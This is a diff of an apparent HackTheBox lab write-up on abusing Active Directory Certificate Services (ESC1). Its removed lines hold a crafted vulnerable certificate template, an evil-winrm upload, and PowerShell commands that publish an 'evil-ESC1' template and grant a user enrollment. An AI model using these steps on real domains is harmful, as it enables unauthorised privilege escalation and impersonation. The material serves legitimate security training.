@@ -1009,49 +1009,6 @@ After some research i find the attribute that controls the `Enrollee Supplies Su
 
 Now ill modify the attribute to `"msPKI-Certificate-Name-Flag": 402653185` this sets the `Enrollee Supplie Subject` to true
 
-```python
-❯❯❯ cat Machine.json 
-{
-  "showInAdvancedViewOnly": true,
-  "nTSecurityDescriptor": "HEX:0100049c2001000000000000000000001400000004000c010600000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0002000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0302000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0702000000002400ff000f000105000000000005150000009dc3769ba40e31d2fcd42b5c0002000000002400ff000f000105000000000005150000009dc3769ba40e31d2fcd42b5c07020000000014009400020001010000000000050b0000000105000000000005150000009dc3769ba40e31d2fcd42b5c07020000",
-  "flags": 66144,
-  "pKIDefaultKeySpec": 1,
-  "pKIKeyUsage": "HEX:a000",
-  "pKIMaxIssuingDepth": 0,
-  "pKICriticalExtensions": [
-    "2.5.29.15"
-  ],
-  "pKIExpirationPeriod": 31536000,
-  "pKIOverlapPeriod": 3628800,
-  "pKIExtendedKeyUsage": [
-    "1.3.6.1.5.5.7.3.2",
-    "1.3.6.1.5.5.7.3.1"
-  ],
-  "pKIDefaultCSPs": [
-    "1,Microsoft RSA SChannel Cryptographic Provider"
-  ],
-  "msPKI-RA-Signature": 0,
-  "msPKI-Enrollment-Flag": 32,
-  "msPKI-Private-Key-Flag": 0,
-  "msPKI-Certificate-Name-Flag": 402653185,
-  "msPKI-Minimal-Key-Size": 2048
-}
-```
-
-Now the template is set, and ready to be published to the CA
-
-But unfortunately certipy cannot create templates, it can only modify existing ones
-
-So ill upload this json file through my winrm session
-
-```python
-evil-winrm-py PS C:\Users\e.black\Desktop> upload Machine.json .
-Uploading /home/kali/htb/coder/Machine.json: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1.22k/1.22k [00:00<00:00, 1.83kB/s]
-[+] File uploaded successfully as: C:\Users\e.black\Desktop\Machine.json
-```
-
-Now the file is uploaded i just have to set it up as a new template
-
 https://github.com/GoateePFE/ADCSTemplate/blob/master/ADCSTemplate.psm1
 
 ```python
@@ -1068,19 +1025,7 @@ evil-winrm-py PS C:\Users\e.black\Desktop> Import-Module .\ADCSTemplate.psm1
 
 Ill then import it
 
-```python
-evil-winrm-py PS C:\Users\e.black\Desktop> type Machine.json | ConvertTo-Json | Set-Content evil-ESC1.json
-evil-winrm-py PS C:\Users\e.black\Desktop> New-ADCSTemplate -DisplayName "evil-ESC1" -Publish -JSON (cat evil-ESC1.json -raw)
-evil-winrm-py PS C:\Users\e.black\Desktop> Set-ADCSTemplateACL -DisplayName "evil-ESC1" -type allow -identity 'coder\e.black' -enroll
-```
+https://github.com/Orange-Cyberdefense/GOAD/blob/main/ansible/roles/adcs_templates/files/ESC1.json
 
-First ill ensure its reading it as JSON so ill convert the output to json then put this into a new file
 
-Then create the template using the new json file
-
-Then finally ensure the `e.black` user can enroll
-
-```python
-
-```
 
